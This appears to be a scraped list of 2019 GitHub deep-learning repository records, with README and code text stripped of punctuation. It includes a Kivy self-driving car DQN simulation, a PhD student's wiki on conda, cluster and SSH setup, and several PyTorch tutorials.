batchnextstate batchreward batchaction self lastaction action self laststate newstate self lastreward reward self rewardwindow append reward if len self rewardwindow 1000 del self rewardwindow 0 return action def score self return sum self rewardwindow len self rewardwindow 1 def save self torch save statedict self model statedict optimizer self optimizer statedict lastbrain pth def load self if os path isfile lastbrain pth print loading checkpoint checkpoint torch load lastbrain pth self model loadstatedict checkpoint statedict self optimizer loadstatedict checkpoint optimizer print done else print no checkpoint found 2 MAP File Self Driving Car Importing the libraries import numpy as np from random import random randint import matplotlib pyplot as plt import time Importing the Kivy packages from kivy app import App from kivy uix widget import Widget from kivy uix button import Button from kivy graphics import Color Ellipse Line from kivy config import Config from kivy properties import NumericProperty ReferenceListProperty ObjectProperty from kivy vector import Vector from kivy clock import Clock Importing the Dqn object from our AI in ai py from ai import Dqn Adding this line if we don t want the right click to put a red point Config set input mouse mouse multitouchondemand Introducing lastx and lasty used to keep the last point in memory when we draw the sand on the map lastx 0 lasty 0 npoints 0 length 0 Getting our AI which we call brain and that contains our neural network that represents our Q function brain Dqn 5 3 0 9 action2rotation 0 20 20 lastreward 0 scores Initializing the map firstupdate True def init global sand global goalx global goaly global firstupdate sand np zeros longueur largeur goalx 20 goaly largeur 20 firstupdate False Initializing the last distance lastdistance 0 Creating the car class class Car Widget angle NumericProperty 0 rotation NumericProperty 0 velocityx NumericProperty 0 velocityy NumericProperty 0 velocity ReferenceListProperty velocityx velocityy sensor1x NumericProperty 0 sensor1y NumericProperty 0 sensor1 ReferenceListProperty sensor1x sensor1y sensor2x NumericProperty 0 sensor2y NumericProperty 0 sensor2 ReferenceListProperty sensor2x sensor2y sensor3x NumericProperty 0 sensor3y NumericProperty 0 sensor3 ReferenceListProperty sensor3x sensor3y signal1 NumericProperty 0 signal2 NumericProperty 0 signal3 NumericProperty 0 def move self rotation self pos Vector self velocity self pos self rotation rotation self angle self angle self rotation self sensor1 Vector 30 0 rotate self angle self pos self sensor2 Vector 30 0 rotate self angle 30 360 self pos self sensor3 Vector 30 0 rotate self angle 30 360 self pos self signal1 int np sum sand int self sensor1x 10 int self sensor1x 10 int self sensor1y 10 int self sensor1y 10 400 self signal2 int np sum sand int self sensor2x 10 int self sensor2x 10 int self sensor2y 10 int self sensor2y 10 400 self signal3 int np sum sand int self sensor3x 10 int self sensor3x 10 int self sensor3y 10 int self sensor3y 10 400 if self sensor1x longueur 10 or self sensor1xlargeur 10 or self sensor1y 10 self signal1 1 if self sensor2x longueur 10 or self sensor2xlargeur 10 or self sensor2y 10 self signal2 1 if self sensor3x longueur 10 or self sensor3xlargeur 10 or self sensor3y 10 self signal3 1 class Ball1 Widget pass class Ball2 Widget pass class Ball3 Widget pass Creating the game class class Game Widget car ObjectProperty None ball1 ObjectProperty None ball2 ObjectProperty None ball3 ObjectProperty None def servecar self self car center self center self car velocity Vector 6 0 def update self dt global brain global lastreward global scores global lastdistance global goalx global goaly global longueur global largeur longueur self width largeur self height if firstupdate init xx goalx self car x yy goaly self car y orientation Vector self car velocity angle xx yy 180 lastsignal self car signal1 self car signal2 self car signal3 orientation orientation action brain update lastreward lastsignal scores append brain score rotation action2rotation action self car move rotation distance np sqrt self car x goalx 2 self car y goaly 2 self ball1 pos self car sensor1 self ball2 pos self car sensor2 self ball3 pos self car sensor3 if sand int self car x int self car y 0 self car velocity Vector 1 0 rotate self car angle lastreward 1 else otherwise self car velocity Vector 6 0 rotate self car angle lastreward 0 2 if distance lastdistance lastreward 0 1 if self car x 10 self car x 10 lastreward 1 if self car x self width 10 self car x self width 10 lastreward 1 if self car y 10 self car y 10 lastreward 1 if self car y self height 10 self car y self height 10 lastreward 1 if distance 100 goalx self width goalx goaly self height goaly lastdistance distance Adding the painting tools class MyPaintWidget Widget def ontouchdown self touch global length npoints lastx lasty with self canvas Color 0 8 0 7 0 d 10 touch ud line Line points touch x touch y width 10 lastx int touch x lasty int touch y npoints 0 length 0 sand int touch x int touch y 1 def ontouchmove self touch global length npoints lastx lasty if touch button left touch ud line points touch x touch y x int touch x y int touch y length np sqrt max x lastx 2 y lasty 2 2 npoints 1 density npoints length touch ud line width int 20 density 1 sand int touch x 10 int touch x 10 int touch y 10 int touch y 10 1 lastx x lasty y Adding the API Buttons clear save and load class CarApp App def build self parent Game parent servecar Clock scheduleinterval parent update 1 0 60 0 self painter MyPaintWidget clearbtn Button text clear savebtn Button text save pos parent width 0 loadbtn Button text load pos 2 parent width 0 clearbtn bind onrelease self clearcanvas savebtn bind onrelease self save loadbtn bind onrelease self load parent addwidget self painter parent addwidget clearbtn parent addwidget savebtn parent addwidget loadbtn return parent def clearcanvas self obj global sand self painter canvas clear sand np zeros longueur largeur def save self obj print saving brain brain save plt plot scores plt show def load self obj print loading last saved brain brain load Running the whole thing if name main CarApp run 3 kivy 1 0 9 ref https kivy org docs tutorials pong html size 20 10 canvas PushMatrix Rotate angle self angle origin self center Rectangle pos self pos size self size PopMatrix size 10 10 canvas Color rgba 1 0 0 1 Ellipse pos self pos size self size size 10 10 canvas Color rgba 0 1 1 1 Ellipse pos self pos size self size size 10 10 canvas Color rgba 1 1 0 1 Ellipse pos self pos size self size car gamecar ball1 gameball1 ball2 gameball2 ball3 gameball3 Car id gamecar center self parent center Ball1 id gameball1 center self parent center Ball2 id gameball2 center self parent center Ball3 id gameball3 center self parent center,2019-09-11T22:25:52Z,2019-10-18T21:20:31Z,n/a,archit047,User,1,1,0,3,master,archit047,1,0,0,0,0,0,0
guochengqian,deep_learning_phd_wiki,n/a,Deep Learning Phd Wiki My personal wiki for my Phd cadidate life in computer vision and computer graphics Content 1 Coding wiki coding wiki 1 How to install environment anaconda and environment 1 How to use Pytorch how to use pytorch 1 How to use Ibex how to use ibex 1 Useful Cheatsheet some useful codes 1 Personal Website personal website Coding Wiki Anaconda and Environment Anaconda3 is a very useful tool to manage environment I usually install a new env for each different project Like when I worked on deep gcn I created an anaconda3 env called deepgcn Everytime I wanted to run code of this project I just had to conda activate deepgcn to activate the env How to use conda Here is example how to install anaconda3 and pytorch env and use them deepgcnenvinstall sh find this file in modules usr bin env bash make sure command is source deepgcnenvinstall sh uncomment to install anaconda3 cd wget https repo anaconda com archive Anaconda3 2019 07 Linux x8664 sh bash Anaconda3 2019 07 Linux x8664 sh uncommet if using cluster module purge module load gcc module load cuda 10 1 105 make sure your annaconda3 is added to bashrc normally add to bashrc path automatically source bashrc conda create n deepgcn conda create env conda activate deepgcn activate conda install and pip install conda install y pytorch torchvision cudatoolkit 10 0 tensorflow python 3 7 c pytorch install useful modules pip install tqdm Install the env above by source deepgcnenvinstall sh Now you install the new env called deepgcn conda activate deepgcn and have fun If you want to improve you knowledge about anaconda see the doc https docs conda io projects conda en latest user guide tasks manage environments html here for detailed information Install CUDA and GPU Driver There is a bash script helps you install CUDA10 cudnn and driver on unbuntu18 04 easily Find the script modules install cuda 10 ubuntu18 sh All you need to do is source modules install cuda 10 ubuntu18 sh Jupyter Lab coda env Jupyter lab is a very useful web based user interface for project It s automaticall installed when you install ananconda3 You have to add conda env to jupyter lab manually by code below conda activate myenv python m ipykernel install user name myenv display name Python myenv remote server Sometimes we may need to run jupyter lab on our laptop but use the hardware and env of remote workstation How to do that Open one terminal in your laptop then open jupyter lab by code below ssh remoteAccount eremoteIp connect remote server jupyter notebook password uncomment if you have not set password do it once jupyter lab port 9000 no browser Open another terminal in your laptop then map ip by code below ssh N f L 8888 localhost 9000 remoteAccount eremoteIp You can kill the port forwarding by ps aux grep ssh kill Now open your chrome type http localhost 8888 Enjoy your remote jupyter lab More info see blog http www blopig com blog 2018 03 running jupyter notebook on a remote server via ssh How to use Pytorch For beginners there are official tutorials https pytorch org tutorials and 60min exercise https pytorch org tutorials beginner deeplearning60minblitz html you can try at first It s quite beginer friendly and easy to follow Also you can try some easy and funny experiments train a classifier https pytorch org tutorials beginner blitz cifar10tutorial html sphx glr beginner blitz cifar10 tutorial py train an image style transformer https github com leongatys PytorchNeuralStyleTransfer blob master NeuralStyleTransfer ipynb To improve futher I would recommend go through other s code I recommend serval repos in good structure and easy to understand and implement CycleGAN https github com junyanz pytorch CycleGAN and pix2pix by Jun yan Zhu https people csail mit edu junyanz deepgcnpytorch https github com lightaime deepgcnstorch by me and Guohao Li https github com lightaime You need to refer to the official document https pytorch org docs stable index html and stackoverflow sometimes Don t hesitate to ask questions in all the github repos when you need help Some advanced operations 1 Change layers in pretrained models model conv1 0 newmodel conv1 0 1 detach some modules for param in model conv1 parameters param requresgrad False for k param in model namedparameters print k param requiresgrad How to use Ibex Termius I would recomment a software called termius https termius com to all of you This software keep you away from inputing account and password every time you want to login in the cluster You have to add host in termius Add address click ssh add username and password once in termius then you just need to click the host name then you can login into cluster ibex For example address vlogin ibex kaust edu sa username qiang password Kaustxxxx Apply for resources in cluster You can either use sbatch or srun to run your program in cluster 1 sbatch First option is using sbatch to send your job Sbatch send your job in the priority squeue and your code will contiue to run even if your connection with cluster is closed for some reason There is an example of sbatch file find the file in modules trainibex sh bin bash SBATCH J dgcls SBATCH o x 3a A out SBATCH e x 3a A err SBATCH time 9 0 00 00 SBATCH gres gpu v100 1 SBATCH cpus per task 9 SBATCH mem 32G SBATCH qos ivul SBATCH mail user guocheng qian kaust edu sa SBATCH mail type ALL activate your conda env echo Loading anaconda module purge module load gcc module load cuda 10 1 105 module load anaconda3 source bashrc source activate deepgcn echo Anaconda env loaded python u examples classification train py phase train trainpath scratch dragon intel lig guocheng data deepgcn modelnet40 echo training function Done Run sbatch trainibex sh then your job will be put in the squeue See KAUST IBEX offical doc https www hpc kaust edu sa sites default files files public Clustertraining 26112018 0IbexcheatsheetNov262018 pdf for detailed information 2 srun srun allow you to use cluster just like in terminal on your local machine srun is convenient to use however it will stop run when you loss connection to ibex You need tmux to protect the node When you lose connection you can use tmux to login back into the node tmux new s job1 srun time 5 00 00 00 cpus per task 4 mem 10G gres gpu 1 job name gsr8 pty bash 3 salloc Please do NOT use salloc only if you need all the GPUs in the node salloc time 5 00 00 00 cpus per task 8 mem 32G gres gpu 4 job name sr There is a tmux cheatsheet https gist github com MohamedAlaa 2961058 Load or purge modules use module list to see your current modules use module avail to see all the modules available in cluster use module purge to unload all the modules you loaded use module unload xxx to unload a module use module load xxx to load the module you want Data Localtion Put your data in this folder ibex scratch YOUR ACCOUNT IO in this folder is faster than other location File Transfer Termius allows you to transfer files by GUI You can also transfer files by scp scp r FolderPath YourAccount YourIP location scp a folder scp FilePath YourAccount YourIP location scp a file rsync vahP FilePath qiang 10 68 74 156 location You can know your ip by ifconfig If you want to scp many files you can zip it at first It s faster Skynet IP If you are in Bernard s Group you can use skynet our own cluster ip is 10 68 106 3 Login in by ssh youraccount 10 68 106 3 Some useful codes Debug 1 tensor 2 CV IMAGE from TorchTools DataTools FileTools import tensor2cvimage import numpy as np import cv2 imgoutput tensor2cvimage img 0 np uint8 cv2 imwrite data debug img png imgoutput 2 model parameters model SFE1 nn modules 0 weight Linux 1 counting ls l wc l 2 download wget r p np k 3 count storage usage du max depth 1 h 4 show modified time stat c y n 5 watch gpu usage watch n 0 1 nvidia smi Vim vim top of file gg vim end of file GA remember CAPS Vim cheatsheet https vim rtorr com MarkDown Markdown Cheatsheet https github com adam p markdown here wiki Markdown Cheatsheet Tmux Tmux Cheatsheet https gist github com MohamedAlaa 2961058 Pycharm Pycharm Cheatsheet https www jetbrains com help pycharm mastering keyboard shortcuts html jupter lab JupyterLab Cheatsheet https blog ja ke tech 2019 01 20 jupyterlab shortcuts html Personal Website Personal website is important to an acdemic researcher How to design Your Own Homepage Github Pages set up You can use github pages to host your website for free Just follow the step it takes you 30 min than you will enjoy your own pages 1 Create a github account Config your git environment if you are not familiar with git please refer to git beginner https product hubspot com blog git and github tutorial for beginners 2 Create a new repository repo in github name rop into username github io username is your github account name You cannot use other name This repo is different with others it is a special repo called github pages Refer to how to design github pages for details https guides github com features pages It may take you 20 mins 3 Find a personal homepage that you like and down the source code by wget r p np k http xxxx com Please ask for the author for the approval 4 Keep and architectrure the same but change content into yours 5 Put all the source code into github page repo your created before 6 Git add commit and push the code 7 Done It s so easy Surf your website username github io and enjoy More information you can looking into github pages https guides github com features pages or google If you want use your own domain like xxx com instead of the free github io please refer to follows New domain username com Setup We have to buy a new domain and redirect the xxx github io to this domain 1 buy a domain you can buy from alibaba tencent godaddy name com I buy it from www laoxuehost com 2 set up dns please refer to details 3 repo setting Type your new website in custom domain in repo setting Like the picture show 4 wait for the new domain to be become effective Be patient it could be as long as 1day 5 Done Surf your website username com and enjoy If you have any problem you can looking into Github Page Redirect https help github com en articles redirects on github pages for more detailes Google index Let baidu google know your domain so you can search your website by google 1 submit url submit url to baidu https ziyuan baidu com linksubmit url google https search google com search console welcome,2019-09-12T12:39:13Z,2019-11-27T16:20:11Z,Python,guochengqian,User,1,1,0,41,master,guochengqian,1,0,0,0,0,0,1
utkuyucel,Not-Deep-Learning,n/a,Not Deep Learning,2019-09-12T09:50:37Z,2019-09-12T09:53:23Z,Python,utkuyucel,User,1,1,0,3,master,utkuyucel,1,0,0,0,0,0,0
christian-stohlmann,Deep-Learning-Coding-Assignments,n/a,,2019-08-22T06:03:49Z,2019-08-22T06:52:48Z,Jupyter Notebook,christian-stohlmann,User,1,1,0,54,master,christian-stohlmann,1,0,0,0,0,0,0
lnpandey,Deep-Learning-Course,n/a,,2019-08-10T06:55:22Z,2019-08-24T07:26:48Z,n/a,lnpandey,User,1,1,0,12,master,lnpandey,1,0,0,0,0,0,0
sanjeetpal007,python-deep-learning,n/a,,2019-08-11T14:21:02Z,2019-08-23T16:37:41Z,Python,sanjeetpal007,User,1,1,1,6,master,sanjeet123456789#sanjeetpal007,2,0,0,0,0,0,0
vseib,deep_learning_nano_degree,n/a,deeplearningnanodegree This repository contains exercises that I completed during Udacity s Nano Degree program on Deep Learning https www udacity com course deep learning nanodegree nd101 Some of these exercises were part of the program while others were additional things that I tried based on the given tasks Description The exercises contained in this repository are very diverse I provide a detailed description in the README md files of each of the subfolders along with my reasoning for the presented solutions I also provide additional material for most lectures All exercises were converted to Python files The original Jupyter notebooks can be found in Udacity s repository see Acknowledgments The subfolders are prefixed with the lecture number and contain the following material 02neuralnetworks lecture 2 5 project 1 predicting bike sharing patterns additional material PyTorch implementation lecture 2 6 sentiment analysis additional material PyTorch implementation lecture 2 7 introduction to PyTorch additional material 2 different MLPs for MNIST and FMNIST evaluation of hyperparameters Acknowledgments The original repository of this Nano Degree program can be found here https github com udacity deep learning v2 pytorch git Since I was learning PyTorch during that course many of my solutions are embedded into the original task descriptions of Udacity Further my code is very similar in style and structure to what I learned during that program Installation Download and install Anaconda from the Anaconda website https www anaconda com distribution Create and activate an environment adjust python version if needed conda create n nanodl python 3 7 conda activate nanodl conda install numpy pandas matplotlib scikit learn conda install pytorch torchvision c pytorch This will already install the cudatoolkit 10 package for PyTorch Note however that you still need to install Cuda to be able to use the GPU in PyTorch Since I do not have a GPU in my computer the following instructions might be incomplete or not entirely correct Consider them only as a hint In Ubuntu you might need additional packages after installing Cuda sudo apt install nvidia 390 Further you need to activate the graphics drivers in the system settings Depending on the Cuda version available for your system you might need to downgrade the installed PyTorch cudatoolkit e g like this conda activate nanodl conda install cudatoolkit 9 0 c pytorch Test if the GPU is correctly found by PyTorch conda activate nanodl python Inside the Python console type the following import torch torch cuda isavailable If this prints out True then your GPU was correctly found by PyTorch License This code is released under the BSD 3 Clause license See LICENSE LICENSE for details,2019-09-11T17:19:37Z,2019-12-07T15:16:14Z,Python,vseib,User,1,1,0,60,master,vseib,1,0,0,0,0,0,0
philexohf,Deep_Learning_with_Python,n/a,,2019-08-31T03:17:41Z,2019-09-03T11:53:22Z,Python,philexohf,User,1,1,0,4,master,philexohf,1,0,0,0,0,0,0
ankitbarai507,Stock-predictor-Deep-learning,n/a,Stock predictor Deep learning Stock prediction using Deep learning python getdataset py eg NSE SBIN python mainfile py,2019-09-13T06:18:49Z,2019-11-21T02:59:39Z,Python,ankitbarai507,User,1,1,0,2,master,ankitbarai507,1,0,0,0,0,0,0
zhangchao162,deep-learning-cnn,n/a,File Structure 01 perception backpropagation py 02 mnist activators py some common activation functions relu sigmoid tanh included cnn py conv py to implement a simple convolutional network includig convolutional padding maxpolling forwarfpropogation and backpropogation process mnist py using paddlepaddle framework to train a simple cnn network and improve the baseline network the accuracy of improved network is 99 28 03 dataprocessing sentimentanalyze py create reader to convert text data to train and test mnistdata py extracing mnist dataset and create readercreator to convert data format to train and test 04 imageclassification Tensorflowcifar10 vggtf py tensorflowvgg16cifar 10shuju VGG16 vgg16 https github com zhangchao162 deep learning cnn blob master vgg16 png 05 imageproject 06 platerecognition genGreenPlate py genPlate py,2019-08-30T06:13:13Z,2019-08-30T10:10:15Z,Python,zhangchao162,User,1,1,0,10,master,zhangchao162,1,0,0,0,0,0,0
rohitrrg,Deep_Learning_A-Z,n/a,,2019-08-31T10:49:26Z,2019-08-31T11:28:53Z,Python,rohitrrg,User,1,1,0,1,master,rohitrrg,1,0,0,0,0,0,0
Yzma-Robotics,Deep-Learning-Udacity,n/a,https media giphy com media mhGMNIOb37PcQ giphy gif Deep learning is driving advances in artificial intelligence that are changing our world Build and apply your own deep neural networks to challenges like image classification and generation time series prediction and model deployment,2019-09-18T11:48:07Z,2019-09-18T11:51:58Z,Jupyter Notebook,Yzma-Robotics,Organization,1,1,0,2,master,2series,1,0,0,0,0,3,0
AudreyBeard,deep-learning-resources,n/a,deep learning intro A collaborative collection of resources for learning the theory and practice of deep learning PyTorch This repo focuses on PyTorch since that s what we use in the lab To get started with PyTorch check out pytorch intro md https github com AudreyBeard deep learning resources blob master pytorch intro md Deep Learning There are myriad sources for learning about deep learning Here s a running list of the best ones we can find A Recipe for Training Neural Networks https karpathy github io 2019 04 25 recipe This blog post was written by Andrej Karpathy an author of the ImageNet https arxiv org pdf 1409 0575 pdf paper and PhD student of CS at Stanford https twitter com suzatweet status 1178548751012466688 s 09 https twitter com jeremyphoward status 1178351261608861701 s 19 Important Papers ImageNet https arxiv org pdf 1409 0575 pdf Arguably pivotal in launching the present wave of computer vision research Enormous and ever growing image dataset Yearly challenges for several tasks Now a Kaggle competition https www kaggle com c imagenet object localization challenge See image net org http www image net org for more info,2019-09-06T19:30:38Z,2019-10-21T14:07:51Z,n/a,AudreyBeard,User,1,1,0,10,master,AudreyBeard,1,0,0,1,0,0,0
anoubhav,CS7015-Deep-Learning,n/a,CS7015 Deep Learning This repository contains code for the assignments and projects related to CS7015 Deep Learning course offered by IITM CS department,2019-09-01T18:08:57Z,2019-11-12T16:54:24Z,Jupyter Notebook,anoubhav,User,1,1,0,5,master,anoubhav,1,0,0,0,0,0,0
cyan-ide,deep_learning_examples,n/a,deeplearningexamples sample code for all sorts of deep learning experiments,2019-09-15T06:14:50Z,2019-12-07T21:22:47Z,Jupyter Notebook,cyan-ide,User,1,1,0,1,master,cyan-ide,1,0,0,0,0,0,0
ILoveStudying,PKU-Deep-Learning,n/a,PKU Deep Learning github2019 github https github com PeiqinSun tf tutorials github,2019-08-18T12:41:28Z,2019-09-18T02:09:22Z,Python,ILoveStudying,User,1,1,0,21,master,ILoveStudying,1,0,0,0,0,0,0
fyqqyf,Deep-Learning-with-Python,n/a,Deep Learning with Python A document that improves the source code of the book and addresses issues that may be encountered during the learning process Motivation I am studying this book I found that the source code and data given in the book have some problems with the update of the keras version so I created this document to solve these problems Introduction I uploaded the improved documentation and made a comment If you have encountered an unresolved issue during the learning process you can ask me a question PS This repository will be continuously updated,2019-08-25T07:31:13Z,2019-08-25T08:08:03Z,Jupyter Notebook,fyqqyf,User,1,1,0,5,master,fyqqyf,1,0,0,0,0,0,0
yannistze,Deep-Learning-Project-2019,n/a,Deep Learning Project Attribute a song to an author or a genre Link to Report http yannistze github io Deep Learning Project 2019 docs COMSW4995DeepLearningProjectFinalReport pdf Setup Our project depends on Hedwig which is designed for Python 3 6 and PyTorch https pytorch org 0 4 PyTorch recommends Anaconda https www anaconda com distribution for managing your environment We d recommend creating a custom environment as follows conda create f environment yml Code depends on data from NLTK e g stopwords so you ll have to download them Run python src nltkdownload py Datasets Download the Reuters word2vec embeddings from hedwig data https git uwaterloo ca jimmylin hedwig data git clone https github com j cahill hedwig git git clone https git uwaterloo ca jimmylin hedwig data git After cloning the hedwig data repo you need to unzip the embeddings and run the preprocessing script cd hedwig data embeddings word2vec gzip d GoogleNews vectors negative300 bin gz python bin2txt py GoogleNews vectors negative300 bin GoogleNews vectors negative300 txt Create Lyrics Dataset Download 380 000 lyrics from metrolyrics https kaggle com gyani95 380000 lyrics from metrolyrics and 55 000 song lyrics https www kaggle com mousehead songlyrics from Kaggle Run python src datapreprocessing py To impute the missing genre values using the Genius API Then run python src lyricspreprocessor py python src lyricspreprocessorartists py to perform basic data cleanup and create train test dev splits for both genre and artist Folder Structure It is imperative for the code to run that the repo be structured in the following way Deep Learning Project hedwig hedwig data LyricsGenre train tsv test tsv dev tsv LyricsArtist train tsv test tsv dev tsv Other files and folder may be present as well but this structure must be observed Model Training Genre Train a BERT model with the following command testing will immediately follow cd hedwig python m models bert dataset LyricsGenre model bert base uncased max seq length 256 batch size 16 lr 2e 5 epochs 2 Artist cd hedwig python m models bert dataset LyricsArtist model bert base uncased max seq length 256 batch size 16 lr 2e 5 epochs 20 Models are saved to hedwig modelcheckpoints,2019-09-17T02:54:00Z,2019-11-13T20:17:21Z,Jupyter Notebook,yannistze,User,1,1,0,8,master,yannistze,1,0,0,0,0,0,0
lakithasahan,pytorch_deep_learning,n/a,PyTorchdeeplearning In this example we use PyTorch deep learning library to classify famous IRIS data set You can download the complete code with data set from download section Below shows a simple structure of a Neural Network 2 ann structure https user images githubusercontent com 24733068 65293767 b2597180 db9f 11e9 8293 f7b5c78c7b1b jpg Lets see how we can implement a simple 2 layer Neural Network using python library numpy As you can observe from the above nn structure we need to define few levels Input Hidden and Output Step 1 You need to make a Forward pass Inputs should be multiply elements wise with the initially initialised random weights w1 at the 1st layer then output from that layer should passed through a activation function such as RELU to the next layer to multiply with the next layer with predefined weights w2 to obtain the initial prediction output Step 2 Now you need find the Loss of data by comparing predicted output in step 1 with the desired output it should deliver Step 3 In this step we need to compute the gradients of w1 and w2 with respect to loss calculated in above step Step 4 Now you need use that gradients of w1 and w2 w1grad w2grad to update the existing weights w1 and w2 with a predefined learning rate Repeat the above steps several time to obtain desired result epochs Please find code for simple NN example created using Numpy below python import numpy as np N is batch size Din is input dimension H is hidden dimension Dout is output dimension N Din H Dout 5 10 5 2 Create random input and output data x np random randn N Din y np random randn N Dout Randomly initialize weights w1 np random randn Din H w2 np random randn H Dout learningrate 1e 6 for t in range 500 Forward pass compute predicted y h x dot w1 hrelu np maximum h 0 ypred hrelu dot w2 print h print hrelu print ll Compute and print loss loss np square ypred y sum print t loss Backprop to compute gradients of w1 and w2 with respect to loss gradypred 2 0 ypred y gradw2 hrelu T dot gradypred gradhrelu gradypred dot w2 T gradh gradhrelu copy gradh h 0 0 gradw1 x T dot gradh Update weights w1 learningrate gradw1 w2 learningrate gradw2 Since now you have a basic idea how the NN can be implement using numpy lets move to PyTorch implementation At its core PyTorch provides two main features An n dimentional Tesnor Similar to numpy but with GPU accelaration Automatic diffrentiation for building and training neural networks Below shows a PyTorch cheat sheet which will be extreamly important in creating your desired network pytorch cheat https user images githubusercontent com 24733068 65290717 b5e6fb80 db93 11e9 905f 159e41df2f30 jpg Below show a example code i wrote to classify IRIS data using PyTorch deep learning Complete code can be found in the download section In PyTorch all your layers can be stacked in nn sequential package given For Further understanding NN i created to classify IRIS data consist Input level one Hidden level and a Output level Number of attributes in the IRIS dataset 4 Number of outputs in IRIS dataset 3 Assumed Number of Hidden Layers 100 pytorchpred https user images githubusercontent com 24733068 65365956 8e5e6480 dc61 11e9 8764 7c2d8cee932e png python model nn Sequential nn Linear nin nh Initial data send to Linear Input layer 4X100 torch nn ReLU and then the result above layer goes to Activation function nn Linear nh nh Then result output from the above activation layers goes to next Linear Hidden Layer 100x100 torch nn ReLU Result from Hidden layer goes to a activation function nn Linear nh nout Then result output from the above activation layers goes to next Linear output Layer 100x3 python define loss function criterion nn CrossEntropyLoss Use the optim package to define an Optimizer that will update the weights of the model for us Here we will use Adam the optim package contains many other optimization algoriths The first argument to the Adam constructor tells the optimizer which Tensors it should update optimizer torch optim Adam model parameters lr 0 001 for epoch in range 2000 Forward pass Compute predicted y by passing x to the model ypred model tensortrainx Compute and print loss loss criterion ypred tensortrainy if epoch 100 0 print number of epoch epoch loss loss item Before the backward pass use the optimizer object to zero all of the gradients for the variables it will update which are the learnable weights of the model This is because by default gradients are accumulated in buffers i e not overwritten whenever backward is called Checkout docs of torch autograd backward for more details optimizer zerograd Backward pass compute gradient of the loss with respect to model parameters loss backward Calling the step function on an Optimizer makes an update to its parameters optimizer step For further in depth undestanding functionalties of PyTorch Please do refer to below tutorial https www tutorialspoint com pytorch index htm,2019-09-19T23:53:52Z,2019-12-04T06:11:45Z,Python,lakithasahan,User,1,1,0,21,master,lakithasahan,1,1,1,0,0,0,0
MHRiday,Deep-Learning-Mini-project-,n/a,In this repo i will upload at least 5 CNN based Mini project Mini Project 1 Aerial Cactus Identification Kaggle Task identify a specific type of cactus in aerial imagery Mini Project 2 Chest X Ray Images Pneumonia Classfication Task Classify a Chest X Ray Image as Pneumonia or Normal,2019-09-16T13:13:03Z,2019-10-06T15:58:11Z,Jupyter Notebook,MHRiday,User,1,1,1,6,master,MHRiday,1,0,0,0,0,0,0
noobying,ubuntu_deep_learning,n/a,ubuntudeeplearning,2019-09-01T02:52:55Z,2019-09-01T10:09:28Z,Jupyter Notebook,noobying,User,1,1,0,5,master,noobying,1,0,0,0,0,0,0
Shadowsych,deep-learning-archives,n/a,Deep Learning References A separate repository from my archives that contains all my deep learning studies and references Deep learning is machine learning using ANNs artificial neural networks It mimics how the human brain operates using artificial neural networks to learn and adapt based on provided input data Neural networks can do all the tasks of a typical statistical model in machine learning but with extra layers to further calculate patterns among the data set Tensorflow Installation We use tensorflow with a keras high level API to make the majority of our deep learning models To install tensorflow type conda conda install tensorflow gpu for GPU usage or conda install tensorflow for CPU usage pip pip install tensorflow gpu for GPU usage or pip install tensorflow for CPU usage If you installed the Tensorflow GPU version there s further setup you need to follow on Tensorflow s GPU Installation Guide https www tensorflow org install gpu Model Selection Regression Dense Standard Artificial Neural Network Classification Dense Standard Artificial Neural Network Image Classification Convolutional Neural Network EDUCATIONAL DISCLAIMER This repository is a non profit educational repository to learn deep learning Images and learning material credit go to SuperDataScience Kirill Eremenko and Hadelin de Ponteves https www superdatascience com deep learning,2019-08-18T17:18:48Z,2019-09-24T03:44:27Z,Jupyter Notebook,Shadowsych,User,1,1,0,13,master,Shadowsych,1,0,0,0,0,0,0
panholly,deep_learning_from_scratch,n/a,,2019-08-31T10:12:25Z,2019-10-20T00:41:32Z,Jupyter Notebook,panholly,User,1,1,0,0,master,,0,0,0,0,0,0,0
ShehzadaAlam,Deep-Learning-Project,computer-vision#deep-learning#machine-learning#python,Deep Learning Project This Repository includes deep learning project,2019-08-14T11:50:49Z,2019-08-21T08:44:32Z,Jupyter Notebook,ShehzadaAlam,User,1,1,0,3,master,ShehzadaAlam,1,0,0,0,0,0,0
PM25,Deep_Learning_Tutorial,n/a,,2019-08-29T03:56:07Z,2019-09-04T03:11:55Z,Jupyter Notebook,PM25,User,1,1,0,4,master,PM25,1,0,0,0,0,0,0
hemant5091,DEEP-LEARNING-padhAI,n/a,DEEP LEARNING padhAI Practical material from https padhai onefourthlabs in course DEEP LEARNING,2019-08-26T04:24:52Z,2019-09-03T14:11:27Z,Jupyter Notebook,hemant5091,User,1,1,0,4,master,hemant5091,1,0,0,0,0,0,0
Dadajon,deep-learning-a-z,n/a,Deep Learning A Z Hands On Artificial Neural Networks IDE PyCharm https img shields io badge PyCharm 2019 3 20 Professional 20Edition brightgreen Spyder https img shields io badge Spyder 3 3 6 red Python https img shields io badge Python 3 7 5 blue,2019-09-05T07:18:51Z,2019-12-06T14:09:58Z,Python,Dadajon,User,1,1,0,26,master,Dadajon,1,0,0,0,0,0,0
Miej,online-deep-learning,n/a,online deep learning click this for a sample video http img youtube com vi Ck5iWa6sUWU 0 jpg http www youtube com watch v Ck5iWa6sUWU sample video Dug up one of the projects I worked on several years ago and thought I would share it here Caveat the code is awful I know but since it still managed to run I figured it might be fun for someone else also Note this isnt production worthy code dont expect it to be what is this tldr summary of the code is it does a shitty implementation of a few layers of lstm to process a live video feed from a webcam or two and it tries to predict some configurable number of frames into the future conditioned on its own action space also Also since I happen to have two identical webcams lying around I adapted the code to also handle concurrent stereoscopic video feeds for the fun of it protip if you cross your eyes you can watch the feeds in 3d D note be mindful of the index used for your webcam video device the code here is just what I use for my own setup yours may or may not be different other little odds and ends at the time I couldn t afford robotic components so I restricted the field of view of the webcam and gave it the ability to move its eyes despite being in a fixed position added a simple version of microsaccades with the idea that it might help the network better generalize the effect of its movements on the predictions added some placeholder feedback images that the network continuously updates and displays to the user in order to create a basic form of human interaction within the actual training routine Fun things to try with the family computer have your computer stare at your for hours on end have your computer stare at your computer screen where it can view its own feedback request images have your computer stare at youtube for hours on end have your computer stare at simple looping gifs for a bit have your computer stare at chaotic motion eg a double pendulum simulation also it s probably just me but I think the video feed of the loss makes for a sort of neat effect creepyfaceemoji exe https i imgur com LoXWoId png enjoy miej mark period woods89 at gmail period com requirements tensorflow gpu numpy cv2 webcam another webcam optional P,2019-09-04T07:46:37Z,2019-09-05T16:01:09Z,Python,Miej,User,2,1,0,6,master,Miej,1,0,0,0,0,0,0
sajid-619,Deep-Learning-with-Keras,n/a,Deep Learning with Keras,2019-09-09T19:02:13Z,2019-10-19T15:11:40Z,Jupyter Notebook,sajid-619,User,1,1,0,5,master,sajid-619,1,0,0,0,0,0,0
